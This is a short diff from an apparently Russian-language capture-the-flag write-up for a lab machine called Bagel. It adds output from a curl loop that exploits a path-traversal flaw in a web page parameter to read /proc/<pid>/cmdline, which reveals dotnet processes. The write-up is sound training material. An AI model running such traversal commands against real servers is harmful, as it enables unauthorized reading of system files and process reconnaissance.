@@ -198,4 +198,13 @@ def order(): # don't forget to run the order app first with "dotnet <path to .dl
 Запускаем поиск данного процесса:
 ```
 for i in $(seq 900 1000); do curl 10.10.11.201:8000/?page=../../../../proc/$i/cmdline -o -; echo "  PID => $i"; done
+
+
+File not found  PID => 921
+File not found  PID => 922
+File not found  PID => 923
+dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 924
+dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 925
+dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll  PID => 926
+/usr/lib/polkit-1/polkitd--no-debug  PID => 927
 ```
